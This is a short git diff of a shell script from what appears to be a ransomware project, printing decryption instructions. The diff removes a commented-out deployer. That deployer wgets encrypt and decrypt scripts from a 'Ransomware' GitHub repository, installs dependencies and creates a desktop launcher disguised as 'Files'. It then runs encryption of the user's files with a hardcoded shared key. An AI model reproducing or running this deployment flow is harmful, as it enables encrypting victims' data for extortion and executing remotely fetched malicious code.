@@ -81,48 +81,4 @@ echo "[*] To decrypt: double-click the 'Files' icon on Desktop or run:"
 echo "    source venv/bin/activate ; python3 client-decrypt-gui.py ; deactivate"
 
 exit 0
-
-
-
-# #!/bin/bash
-# set -euo pipefail
-
-# cd ~/Desktop || exit 1
-
-# # Download Python files
-# wget -q https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch/client-encrypt.py
-# wget -q https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/server-type-arch/client-decrypt-gui.py
-# wget -q https://raw.githubusercontent.com/Google-design/Ransomware/refs/heads/main/requirements.txt
-
-# # Create virtual environment if not exists
-# if [ ! -d venv ]; then
-#   python3 -m venv venv
-# fi
-
-# # Install dependencies
-# source venv/bin/activate
-# pip install --upgrade pip
-# pip install -r requirements.txt --prefer-binary
-# deactivate
-
-# # Create the desktop launcher for decryption
-# cat > decrypt.desktop <<'DESKTOP'
-# [Desktop Entry]
-# Name=Files
-# Exec=/bin/bash -c "cd ~/Desktop && source venv/bin/activate && python3 client-decrypt-gui.py && deactivate"
-# Type=Application
-# Terminal=false
-# Icon=system-lock-screen
-# DESKTOP
-
-# chmod +x decrypt.desktop
-
-# # --- Run encryption once with a hardcoded shared key ---
-# export EDGE_SHARED_KEY="superlongrandomsecret123"
-
-# source venv/bin/activate
-# python3 client-encrypt.py
-# deactivate
-
-# unset EDGE_SHARED_KEY
-# echo "✅ Encryption done. Shared key unset."
+# ---------- END ----------
